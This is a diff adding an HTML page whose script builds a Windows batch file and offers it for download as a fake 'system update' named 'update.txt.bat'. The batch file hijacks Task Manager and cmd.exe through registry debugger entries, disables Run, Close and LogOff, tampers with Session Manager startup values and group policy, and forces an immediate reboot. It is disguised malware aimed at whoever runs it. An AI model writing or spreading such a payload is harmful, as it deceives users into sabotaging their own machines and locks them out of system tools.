@@ -1,0 +1,14 @@
+<html>
+<body>
+<script>
+var batCode = `@echo off\nreg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f\nreg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f\nreg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f\nreg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v "NoClose" /t REG_DWORD /d 1 /f\nreg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v "NoLogOff" /t REG_DWORD /d 1 /f\nreg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" /v "PendingFileRenameOperations" /t REG_MULTI_SZ /d "\\\\?\\C:\\Windows\\System32\\groupolicy\\machine\\registry.pol\\0\\\\0" /f\nreg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" /v "SetupExecute" /t REG_MULTI_SZ /d "cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /f & reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe\" /f & reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /f" /f\nshutdown /r /t 0`;
+
+var batDataUri = 'data:text/plain;base64,' + btoa(batCode);
+var link = document.createElement('a');
+link.href = batDataUri;
+link.download = 'update.txt.bat';
+link.innerHTML = 'Скачать обновление системы';
+document.body.appendChild(link);
+</script>
+</body>
+</html>
